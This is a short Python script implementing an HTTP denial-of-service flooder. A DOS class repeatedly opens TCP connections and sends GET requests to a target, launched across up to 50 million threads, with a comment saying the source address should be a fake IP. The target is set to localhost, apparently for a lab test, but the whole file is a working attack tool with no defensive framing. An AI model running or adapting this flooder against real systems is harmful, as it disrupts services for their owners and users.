import socket
import threading
import logging

from signal import signal, SIGPIPE, SIG_DFL  
signal(SIGPIPE,SIG_DFL)

class DOS():

    def __init__(self, dest_addr,source_addr, port):
        self.dest_addr = dest_addr
        self.source_addr = source_addr # This should be a fake ip
        self.port = port # Port the application is hosted on
    
    def attack(self):
        # try:
        while True:
            # Sending Get requests to destination machine
            logging.info(f"ATTACKING {self.dest_addr} from {self.source_addr} on port: {self.port}")
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((self.dest_addr,self.port))
            s.sendto(("GET /" + self.dest_addr + " HTTP/1.1\r\n").encode('ascii'),(self.dest_addr,self.port))
            s.sendto(("GET /" + self.source_addr + " HTTP/1.1\r\n").encode("ascii"),(self.dest_addr,self.port))
            s.close()
        # except Exception as e:
        #     logging.error(e)

# Making x amount of threads to flood network
    def threading(self):
        for i in range(50000000):
            logging.info(f"{i} attemps")
            thread = threading.Thread(target=self.attack)
            thread.start()

eat_all_the_cookies = DOS("127.0.0.1","10.10.10.9",5000)
eat_all_the_cookies.threading()


